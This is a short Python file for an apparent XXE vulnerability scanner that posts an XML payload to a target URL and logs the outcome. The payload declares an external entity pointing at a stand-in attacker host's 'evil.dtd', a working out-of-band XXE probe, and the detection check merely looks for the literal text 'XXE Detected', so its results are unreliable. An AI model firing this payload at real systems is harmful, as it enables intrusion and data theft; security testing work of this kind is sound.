import requests
import logging


class XxeVulnerabilityScanner:
    def __init__(self, url):
        self.url = url
        self.headers = {'Content-Type': 'application/xml'}
        self.log_file = "vulnerability_scan.log"

    def _send_request(self, payload):
        try:
            response = requests.post(self.url, data=payload, headers=self.headers)
            return response.text
        except requests.RequestException as e:
            logging.error(f"Error during scan: {str(e)}")
            return None

    def _log_result(self, result):
        with open(self.log_file, "a") as log:
            log.write(result + "\n")

    def scan_xxe_vulnerability(self):
        xml_payload = """<?xml version="1.0"?>
            <!DOCTYPE test [
            <!ENTITY xxe SYSTEM "http://attacker-controlled-server.com/evil.dtd">
            ]>
            <test>&xxe;</test>
        """
        result = self._send_request(xml_payload)

        if result and "XXE Detected" in result:
            result_msg = "Possible vulnerability found"
        else:
            result_msg = "No vulnerability Found"

        self._log_result(result_msg)
        return result_msg
